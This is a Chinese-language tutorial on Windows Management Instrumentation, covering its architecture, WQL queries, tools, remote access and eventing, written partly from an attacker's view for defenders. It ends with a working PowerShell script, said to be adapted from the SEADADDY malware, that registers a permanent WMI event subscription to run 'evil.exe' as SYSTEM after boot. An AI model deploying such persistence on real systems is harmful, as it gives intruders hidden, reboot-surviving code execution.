本文分两部分，第一部分是基础，第二部分是方法，先来看下总体大纲：

简介

WMI Architecture（架构）

Managed Components（管理组件）

Consuming Data（数据处理）

Querying Data（数据查询）

Populating Data（数据填充）

Structuring Data（构造数据）

Transmitting Data（数据传输）

Performing Actions（执行操作）

WMI 类和命名空间

查询WMI

Instance Queries

Event Queries

Meta Queries

与WMI交互

PowerShell

wmic.exe

wbemtest.exe

WMI Explorer

CIM Studio

Windows Script Host (WSH) languages

C/C++ via IWbem* COM API

.NET using System.Management classes

winrm.exe

wmic and wmis-pth for Linux

远程WMI

DCOM (Distributed Component Object Model)

WinRM (Windows Remote Management)

WMI Eventing（WMI事件）

Eventing Requirements（事件要求）

Event FIlters（事件过滤器）

Intrinsic Events

Extrinsic Events

Event Consumers（事件处理）

恶意WMI持久化实例

WMI Attach（WMI攻击）

信息收集

AV/VM 检测

反病毒软件检测

VM/沙盒检测

虚拟机检测

代码执行和横向移动

Win32_Process Create方法

利用Event 处理

持久化

隐秘存储

利用WMI做C2

Push攻击

Pull攻击

WMI Providers（提供者）

恶意WMI Providers（提供者）

WMI 防御

已有的检测工具

利用WMI检测WMI攻击

缓解措施

  

## 简介

随着技术的更新换代，很多技术在Windows系统中被引进和弃用，但是有一种非常强大的技术却保留了下来，自Windows NT 4.0和Windows
95开始就一直延续下来，那就是`Windows Management Instrumentation
(WMI)`，即Windows管理工具。现在所有的Windows系统中都有这个工具，利用它包含的工具集，我们可以管理本地或远程的计算机。

它不仅仅被系统管理员熟知，更因为`Stuxnet`利用WMI来进行攻击的原因而被广大安全人员所知。由于WMI能够提供系统信息收集，防病毒检测，代码执行，横向移动，持久化和盗取数据的能力而很受黑客的欢迎。

随着黑客越来越多的使用WMI技术，了解WMI知识并为已所用，对防御者来说就非常重要。

这个文章主要向读者介绍WMI的主要功能，攻击者如何使用WMI，如何通过WMI绕过IDS以及如何通过WMI Repository做取证。

## WMI Architecture（架构）

WMI是Windows对`WBEM`和`CID`标准的实现。两个标准目的是在企业环境中提供一个行业无关的，用于收集和传输`Managed
Component`（管理组件）信息的方法。  
一个WMI的管理组件可以是一个进程，一个注册表的键，一个安装的服务或一个文件信息，等等。这些标准用来沟通确定实现者应该使用什么方法来`query`（查询），`populate`（填充）,`structure`（构造）,`transmit`（传输）,`perform
actions on`（执行操作）和`consume data`（处理数据）。

![Image](http://m0nst3r.me/usr/uploads/2018/03/3500249191.png)  

Microsoft有实现可以总结为以下几个部分：

### Managed Components（管理组件）

管理组件即WMI的对象，是代表着高度结构化的操作系统数据的`Class
Instances`（类实例）。Microsoft提供了非常多的WMI对象来提供有关系统的信息，比如`Win32_Process`，`Win32_Service`，`AntiVirusProduct`，`Win32_StartupCommand`等。

### Consuming Data（数据处理）

Microsoft提供了一些用来处理WMI数据和执行WMI命令的方法。例如，`PowerShell`提供给了我们一个非常简单的与PowerShell交互的方式。

### Querying Data（数据查询）

所有的WMI对象可以通过一个叫`WQL`的查询语言来查询，这种语言与SQL相似，能够让我们精细地控制返回给用户的WMI对象。

### Populating Data（数据填充）

当用户请求一个WMI对象时，WMI服务（Winmgmt）需要知道请求对象的数据填充方式。这个功能是通过`WMI
Providers`（WMI提供者）来完成的。一个WMI提供者就是一个在注册表中拥有相关`GUID`的注册表键。WMI提供者在数据填充时，做了大量的动作，比如查询所有进程，枚举注册表键等。

当WMI服务填充一个WMI对象时，会有两种类实例：`Dynamic Object`（动态对象）和`Persistent Object`（永久化对象）。  
动态对象是在进行查询时生成的，例如，Win32_Process就是一个动态对象。  
永久化对象是存储在`CIM
Repository`（CIM库）中的，默认放在`%SystemRoot%\System32\wbem\Repository\OBJECTS.DATA`中。

### Structuring Data（构造数据）

WMI对象大部分的结构是通过`Managed Object Format
(MOF)`（管理对象格式）文件中描述的。MOF文件使用类似C++的语法来描述WMI对象。  
当WMI提供者生成原始数据时，MOF文件对提供了这些数据的构造结构。从防御者的角度看，值得注意的是，WMI对象的定义可以不通过MOF文件，攻击者可以通过在CIM库中插入`.Net`代码来定义。

### Transmitting Data（数据传输）

Microsoft提供了两种用于远程传输WMI数据的方法：`DCOM`和`Windows Remote Management (WinRM)`。

### Performing Actions（执行操作）

一些WMI对象包含一些可执行的方法/函数。例如，Win32_Process类的静态函数`Create`就经常被黑客用来做内网中的横向移动。  
WMI还提供了一个`Eventing System`（事件系统），用户可以注册在WMI对象生成，修改或删除时执行的事件处理程序。

## WMI 类和命名空间

操作系统信息是通过WMI对象的方式表示的。一个WMI对象也就是一个WMI类的实例。大多数常用的WMI类在MSDN中都有详细的描述，如Win32_Process类。然而还有很多WMI类并没有文档可查，但是幸运的是，我们可以通过WQL来查询所有的WMI类。

与传统的面向对象编程语言相似，WMI类被分类分层的放在命名空间中。所有的命名空间都是从`ROOT`命名空间下的，当不指定命名空间进行查询时，Microsoft会使用`ROOT\CIMV2`作为默认的命名空间。

所有的WMI设置，包括默认命名空间在下面的注册表键中：

`HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\WBEM`

下面的PowerShell代码会递归查询所有的WMI类及其命名空间：

  1. `function Get-WmiNamespace {`
  2. ` Param ($Namespace='ROOT')`
  3.   

  4. ` Get-WmiObject -Namespace $Namespace -Class __NAMESPACE | ForEach-Object {`
  5. ` ($ns = '{0}\{1}' -f $_.__NAMESPACE, $_.Name)`
  6. ` Get-WmiNamespace -Namespace $ns`
  7. ` }`
  8. `}`
  9.   

  10. `$WmiClasses = Get-WmiNamespace | ForEach-Object {`
  11. ` $Namespace = $_`
  12. ` Get-WmiObject -Namespace $Namespace -List |`
  13. ` ForEach-Object { $_.Path.Path }`
  14. `} | Sort-Object -Unique`

返回的WMI Class 路径如下：

  1. `...`
  2. `\\WIN-Q4UUJ0BPKL9\ROOT\CIMV2:__AbsoluteTimerInstruction`
  3. `\\WIN-Q4UUJ0BPKL9\ROOT\CIMV2:__ACE`
  4. `\\WIN-Q4UUJ0BPKL9\ROOT\CIMV2:__AggregateEvent`
  5. `\\WIN-Q4UUJ0BPKL9\ROOT\CIMV2:__ClassCreationEvent`
  6. `\\WIN-Q4UUJ0BPKL9\ROOT\CIMV2:__ClassDeletionEvent`
  7. `\\WIN-Q4UUJ0BPKL9\ROOT\CIMV2:__ClassModificationEvent`
  8. `\\WIN-Q4UUJ0BPKL9\ROOT\CIMV2:__ClassOperationEvent`
  9. `\\WIN-Q4UUJ0BPKL9\ROOT\CIMV2:__ClassProviderRegistration`
  10. `\\WIN-Q4UUJ0BPKL9\ROOT\CIMV2:__ConsumerFailureEvent`
  11. `\\WIN-Q4UUJ0BPKL9\ROOT\CIMV2:__Event`
  12. `\\WIN-Q4UUJ0BPKL9\ROOT\CIMV2:__EventConsumer`
  13. `\\WIN-Q4UUJ0BPKL9\ROOT\CIMV2:__EventConsumerProviderRegistration`
  14. `\\WIN-Q4UUJ0BPKL9\ROOT\CIMV2:__EventDroppedEvent`
  15. `\\WIN-Q4UUJ0BPKL9\ROOT\CIMV2:__EventFilter`
  16. `\\WIN-Q4UUJ0BPKL9\ROOT\CIMV2:__EventGenerator`
  17. `\\WIN-Q4UUJ0BPKL9\ROOT\CIMV2:__EventProviderRegistration`
  18. `\\WIN-Q4UUJ0BPKL9\ROOT\CIMV2:__EventQueueOverflowEvent`
  19. `\\WIN-Q4UUJ0BPKL9\ROOT\CIMV2:__ExtendedStatus`
  20. `\\WIN-Q4UUJ0BPKL9\ROOT\CIMV2:__ExtrinsicEvent`
  21. `\\WIN-Q4UUJ0BPKL9\ROOT\CIMV2:__FilterToConsumerBinding`
  22. `\\WIN-Q4UUJ0BPKL9\ROOT\CIMV2:__IndicationRelated`
  23. `\\WIN-Q4UUJ0BPKL9\ROOT\CIMV2:__InstanceCreationEvent`
  24. `...`

## 查询WMI

WMI提供了一种非常直观的语法用来查询WMI对象的实例，类和命名空间，即`WQL`。WQL查询通常可以分为以下几类：

  1. Instance Queries（实例查询）：查询WMI对象实例。
  2. Event Queries（事件查询）：等同于在WMI对象创建/修改/删除的时候注册一个消息。
  3. Meta Queries（元查询）：元查询用来获取WMI命名空间和类结构的元信息。

### Instance Queries

这是最常用的WQL查询。基本的格式如下：

`SELECT [Class property name | *] FROM [CLASS NAME] <WHERE [CONSTRAINT]>`

例如，下面的查询语句将返回所有可执行文件名中带有`chrome`的正在运行的进程：

`SELECT * FROM Win32_Process WHERE Name LIKE "%chrome%"`

### Event Queries

事件查询被用作一种消息机制来监听事件类的触发。通常用来在一个WMI对象实例创建/修改/删除的时候给用户发送一个消息。根据消息类型是`intrinsic`（系统自带的）还是`extrinsic`（第三方的），查询语句格式不同：

`SELECT [Class property name | *] FROM [INTRINSIC CLASS NAME] WITHIN [POLLING
INTERVAL] <WHERE [CONSTRAINT]>`

`SELECT [Class property name | *] FROM [EXTRINSIC CLASS NAME] <WHERE
[CONSTRAINT]>`

下面的查询将在用户登录的时候被执行：  
`SELECT * FROM __InstanceCreationEvent WITHIN 15 WHERE TargetInstanceISA
'Win32_LogonSession' AND TargetInstance.LogonType=2`

下面的查询将在用户插入可移除设备时被执行：  
`SELECT * FROM Win32_VolumeChangeEvent Where EventType=2`

### Meta Queries

元查询用来查询WMI命名空间和类结构的信息。最常见的用法是用来列举WMI命名空间的类结构。元查询是实例查询的一个子集，但是与对象查询不同的是，我们查询的是类的实例的定义。格式如下：

`SELECT [Class property name | *] FROM [Meta_Class | SYSTEM CLASS NAME] <WHERE
[CONSTRAINT]>`

下面这个语句会查询所有以`WIN32`开头的WMI的类：

`SELECT * FROM Meta_Class WHERE __CLASS LIKE "Win32%"`

下面这个语句会查询某个命名空间下的所有命名空间：

`SELECT Name FROM __NAMESPACE`

注意，当不显示的指定命名空间时，默认的命名空间为`ROOT\CIMV2`。

## 与WMI交互

Microsoft和一些第三方软件开发者为我们提供了许多能够与WMI交互的工具。下面是部分工具的一个不完全的列表：

### PowerShell

PowerShell是一个非常强大的脚本语言，其中包含很多能够与WMI进行交互的功能。对于`PowerShell v3`版本来说，有如下：

  * Get-WmiObject
  * Get-CimAssociatedInstance
  * Get-CimClass
  * Get-CimInstance
  * Get-CimSession
  * Set-WmiInstance
  * Set-CimInstance
  * Invoke-WmiMethod
  * Invoke-CimMethod
  * New-CimInstance
  * New-CimSession
  * New-CimSessionOption
  * Register-CimIndicationEvent
  * Register-WmiEvent
  * Remove-CimInstance
  * Remove-WmiObject
  * Remove-CimSession

WMI命令和CIM命令的功能相似，但是在`v3`版本的PowerShell中，CIM更加的灵活。使用CIM命令最大的好处就是它们可以在`WinRM`和`DCOM`协议下工作，而WMI命令只支持`DCOM`协议。

从攻击者的角度看，专门用来创建/修改/删除WMI/CIM类的命令是不存在的。但是，使用WMI可以很容易的创建WMI类。  
这篇文章的例子中将主要使用PowerShell，因为它的灵活性，并且攻击者越来越多的使用它。

### wmic.exe

`wmic.exe`是一款非常强大的用来与WMI交互的命令行工具。它有非常多而且方便的WMI对象的别名可使用，可以用来进行更加复杂的查询。  
`wmic.exe`还能够执行WMI方法，攻击者在做内网横向移动时，用的就是Win32_Process的Create方法。但是有一个限制就是，我们不能执行一个接受内置WMI对象的方法。如果PowerShell不可用，用wmic.exe来做系统信息收集和执行一些基本操作还是可以的，它也是常常被渗透测试员和攻击者使用。

### wbemtest.exe

`wbemtest.ext`是一款强大的图形化工具，是出于诊断工具来设计的。可以用来枚举对象实例，执行查询，注册事件，修改WMI对象和类，本地或远程执行。虽然界面不是非常友好，但是对攻击者来说，在其他工具无法使用时，这个工具还是不错的。  
![Image](http://m0nst3r.me/usr/uploads/2018/03/1865826909.png)  

### WMI Explorer

WMI
Explorer是Sapien公司开发的一款商业工具，用来查找WMI类。它拥有非常好的界面，并且可以分层浏览WMI库。它不可以连接远程WMI库并执行查询。  

![Image](http://m0nst3r.me/usr/uploads/2018/03/3660318662.png)  

### CIM Studio

CIM Studio是免费的，来自Microsoft，可以用它方便的浏览WMI库，用来查找WMI类也是不错的。  

![Image](http://m0nst3r.me/usr/uploads/2018/03/4064468572.png)  

### Windows Script Host (WSH) languages

`VBScript`和`JScript`，虽然Microsoft提供的这两个脚本语言名声不太好，但是就与WMI交互功能来说，它们还是很强大的。事实上，有一个完整的后门程序就是使用这两种脚本语言开发的，其中使用WMI功能完成了基本的`C2
(Command and Control)`机制。  
另外，稍后我们会详细介绍，`Event
Consumer`（事件处理）接口`ActiveScriptEventConsumer`，只有这两种脚本语言，而这个接口对攻击者和防御者来说都很有价值。  
不管怎样，在那些没有PowerShell环境的老系统中，VBScript和JScript还是霸主地位。

### C/C++ via IWbem* COM API

请自行查看`COM API for WMI`。如果想详细分析包含WMI功能的恶意软件的话，这个接口对逆向工程师来说也很重要。

### .NET using System.Management classes

.NET
类库在`System.Management`命名空间下提供了几个用于与WMI交互的类，使用C#等语言编写起来也很简单。在下面的例子中，这些类会在PowerShell代码中反复使用。

### winrm.exe

`winrm.exe`可以在本地或远程开启WinRM服务的机器上枚举WMI对象实例，调用方法，创建和删除对象实例。winrm.exe也可用来配置WinRM服务。与WMI交互的理想方法是使用CIM命令的PowerShell，但是这个可以作为替代方法。

  1. `winrm invoke Create wmicimv2/Win32_Process @{CommandLine="notepad.exe";CurrentDirectory="C:\"}`
  2. `winrm enumerate http://schemas.microsoft.com/wbem/wsman/1/wmi/root/cimv2/Win32_Process`
  3. `winrm get http://schemas.microsoft.com/wbem/wsman/1/wmi/root/cimv2/Win32_OperatingSystem`

### wmic and wmis-pth for Linux

`wmic`是一个用来执行WMI查询的简单的Linux命令行工具，可远程调用Win32_Process的Create方法。wmis还接收NTML哈希。

## 远程WMI

WMI的强大体现在通过远程操作的时候。目前，WMI支持两种协议：`DCOM`和`WinRM`，使用这两种协议可以做任何事情，包括查询对象，注册事件和执行WMI类的方法，等等。

两种协议都对攻击者有利，因为防御者通常不会检查这两种协议的恶意流量。利用WMI所需的东西就是可用的有权限的用户凭证。在Linux平台上的`wmis-pth`工具中，只需要提供被攻击者的用户哈希即可。

### DCOM (Distributed Component Object Model)

从WMI被引入的时候起，`DCOM`就被当作默认协议。DCOM通过135端口建立TCP连接，后续的数据交换则通过随机选择的TCP端口传输。这个端口可以通过`dcomcnfg.exe`进行配置和修改，其最终是改动如下注册表项：

`HKEY_LOCAL_MACHINE\Software\Microsoft\Rpc\Internet - Ports (REG_MULTI_SZ)`

所有的PowerShell中内置的WMI命令都使用DCOM协议。

  1. `PS C:\Users\Michael\Desktop> Get-WmiObject -Class Win32_Process -ComputerName WIN-Q4UUJ0BPKL9 -Credential 'WIN-Q4UUJ0BPKL9\Administrator'`

### WinRM (Windows Remote Management)

近来，WinRM已经超过了DCOM，被Windows当作建议使用的协议。WinRM基于`Web Services-Management
(WSMan)`规范，是一个`SOAP-based`设备管理协议。另外，`PowerShell
Remoting`也是基于WinRM规范的，这使得我们能够通过PowerShell在大规模Windows企业环境中实现强大的远程管理功能。WinRM同样支持WMI，或者说CIM的网络操作。

默认情况下，WinRM服务开启并监听`5985/tcp`端口，而且默认是加密的。还可以通过配置证书的方式在`5986/tcp`端口实现`HTTPS`支持。

通过`GPO`，winrm.exe和PowerShell的`WSMan`虚拟盘符，我们可以很方便的配置WinRM。

  1. `PS C:\Users\Michael\Desktop> ls WSMan:\localhost`
  2.   

  3. ` WSManConfig: Microsoft.WSMan.Management\WSMan::localhost`
  4.   

  5. `Type Name SourceOfValue Value`
  6. `---- ---- ------------- -----`
  7. `System.String MaxEnvelopeSizekb 500`
  8. `System.String MaxTimeoutms 60000`
  9. `System.String MaxBatchItems 32000`
  10. `System.String MaxProviderRequests 4294967295`
  11. `Container Client`
  12. `Container Service`
  13. `Container Shell`
  14. `Container Listener`
  15. `Container Plugin`
  16. `Container ClientCertificate`

PowerShell提供了方便的命令去检测WinRM服务是否处于监听状态——`Test-WSMan`。  
如果Test-WSMan有返回结果，则说明WinRM服务正常，而且这个命令不需要传入认证信息。

  1. `PS C:\Users\Michael> Test-WSMan -ComputerName WIN-JF74R0AP7LN`
  2.   

  3.   

  4. `wsmid : http://schemas.dmtf.org/wbem/wsman/identity/1/wsmanidentity.xsd`
  5. `ProtocolVersion : http://schemas.dmtf.org/wbem/wsman/1/wsman.xsd`
  6. `ProductVendor : Microsoft Corporation`
  7. `ProductVersion : OS: 0.0.0 SP: 0.0 Stack: 3.0`

如果要与运行着WinRM服务的系统的WMI进行远程交互，可用命令有两个：`winrm.exe`和PowerShell的`CIM命令`。

  1.   

  2. `PS C:\Users\Michael> $s = New-CimSession -ComputerName win -Credential 'win\Michael' -Authentication Negotiate`
  3. `PS C:\Users\Michael> Get-CimInstance -CimSession $s -ClassName Win32_Process`
  4.   

  5. `ProcessId Name HandleCount WorkingSetSize VirtualSize PSComputerName`
  6. `--------- ---- ----------- -------------- ----------- --------------`
  7. `0 System Idle P... 0 24576 0 win`
  8. `4 System 545 839680 4771840 win`
  9. `244 smss.exe 29 1056768 5234688 win`
  10. `332 csrss.exe 664 4886528 97574912 win`
  11. `372 wininit.exe 76 4255744 45420544 win`
  12. `380 csrss.exe 290 15814656 168321024 win`
  13. `...`
  14. `3528 SGTool.exe 323 21172224 180084736 win`
  15. `2808 WmiApSrv.exe 121 6074368 32092160 win`

## WMI Eventing（WMI事件）

对攻击者和防御者都非常强大的一个功能是，WMI拥有异步响应WMI事件的能力。加上适当的异常处理，WMI事件基本可以用来响应所有的操作系统事件。

WMI事件分两类，包括运行在本地上下文环境当中的单个进程的事件和永久性WMI事件订阅。（There are two classes of WMI
events – those that run locally in the context of a single process and
permanent WMI event subscriptions.）  
本地事件有生命周期为进程宿主的周期，而永久性WMI事件是存储在WMI库中，以SYSTEM权限运行，并且重启后依然存在。

### Eventing Requirements（事件要求）

为了能够安装一个永久性的WMI事件订阅，必须满足三个条件：

  1. 一个事件过滤器
  2. 一个事件处理：代表一个事件触发时启动的动作
  3. 一个处理绑定的过滤器：代表将一个过滤器绑定到一个事件处理的注册机制

### Event FIlters（事件过滤器）

一个事件过滤器接收一个WMI事件查询参数，并保存到`ROOT\subscription:__EventFilter`对象的一个实例中。  
事件过滤器支持以下类型的查询：

#### Intrinsic Events

`Intrinsic
Events`在当一个WMI类或对象创建，修改，删除的时候被触发，用来传递信息给启动计时器或要执行的WMI方法，下面的这个Intrinsic
Events在所有的WMI命名空间中都有，并以系统类的形式命名（以两个下划线开头）：

  * __NamespaceOperationEvent
  * __NamespaceModificationEvent
  * __NamespaceDeletionEvent
  * __NamespaceCreationEvent
  * __ClassOperationEvent
  * __ClassDeletionEvent
  * __ClassModificationEvent
  * __ClassCreationEvent
  * __InstanceOperationEvent
  * __InstanceCreationEvent
  * __MethodIvocationEvent
  * __InstanceModificationEvent
  * __InstanceDeletionEvent
  * __TimerEvent

这些事件都非常强大，因为它们可以用来触发你能想象到的任何的操作系统事件。例如，一个人可以通过下面的命名在用户登陆时触发一个事件：  
`SELECT * FROM __InstanceCreationEvent WITHIN 15 WHERE TargetInstance ISA
'Win32_LogonSession' AND TargetInstance.LogonType=2`

上面的查询的意思是，在一个登陆类型为2（交互式登陆）的Win32_LogonSession类的实例创建时，触发一个事件。

由于特定Intrinsic Event的调用时间不同，我们必须在查询中指定一个Polling
Interval（时间间隔），也就是说，偶尔我们会触发不了这样的事件。比如一个事件查询的目标是一个WMI类实例的创建，如果这个实例在我们指定的时间间隔内生成并销毁了，那么这个事件将不会被查询到。

#### Extrinsic Events

Extrinsic Events解决了Intrinsic Events的时间间隔的问题，因为当一个事件发生时，一个Extrinsic
Event就立即被触发了，但劣势是当前的WMI中的Extrinsic Events并不多，不过现有有这些也很强大了：

  * ROOT\CIMV2:Win32_ComputerShutdownEvent
  * ROOT\CIMV2:Win32_ProcessStartTrace
  * ROOT\CIMV2:Win32_ModuleLoadTrace
  * ROOT\CIMV2:Win32_ThreadStartTrace
  * ROOT\CIMV2:Win32_VolumnChangeEvent
  * ROOT\DEFAULT:Msft_WmiProvider*
  * ROOT\DEFAULT:RegistryKeyChangeEvent
  * ROOT\DEFAULT:RegistryValueChangeEvent

下面的命令可以查询到用户态和内核态下每个进程的所有模块：  
`SELECT * FROM Win32_ModuleLoadTrace`

### Event Consumers（事件处理）

一个Event Consumer代表当一个事件触发时进行的操作。可用的标准事件处理类：

  * LogFileEventConsumer： 将事件数据写入到指定的日志文件
  * ActiveScriptEventConsumer： 用来执行VBScript/JScript程序
  * NTEventLogEventConsumer：创建一个包含事件数据的日志入口点
  * SMTPEventConsumer：将事件数据用邮件发送
  * CommandLineEventConsumer：执行一条命令

可以想象到，ActiveScriptEventConsumer和CommandLineEventConsumer类应该是攻击者处理事件时使用最频繁的。这两个事件处理类给攻击都提供了一种无文件式的执行任意代码的灵活性。

所有的事件处理类都在从`__EventConsumer`类继承而来的。

### 恶意WMI持久化实例

下面的PowerShell代码来自一个叫SEADADDY的恶意软件的修改版，用来通过WMI做持久化的。其中，事件过滤是从PowerSploit的持久化模块，用于在系统启动时触发，事件处理则以SYSTEM权限执行一个程序。

  1. `$filterName = 'BotFilter82'`
  2. `$consumerName = 'BotConsumer23'`
  3. `$exePath = 'C:\Windows\System32\evil.exe'`
  4. `$Query = "SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System' AND TargetInstance.SystemUpTime >=200 AND TargetInstance.SystemUpTime < 320"`
  5. `$WMIEventFilter = Set-WmiInstance -Class __EventFilter -NameSpace "root\subscription" -Arguments @{Name=$filterName;EventNameSpace="root\cimv2";QueryLanguage="WQL";Query=$Query} -ErrorAction Stop`
  6. `$WMIEventConsumer = Set-WmiInstance -Class CommandLineEventConsumer -Namespace "root\subscription" -Arguments @{Name=$consumerName;ExecutablePath=$exePath;CommandLineTemplate=$exePath}`
  7. `Set-WmiInstance -Class __FilterToConsumerBinding -Namespace "root\subscription" -Arguments @{Filter=$WMIEventFilter;Consumer=$WMIEventConsumer} `

  

  

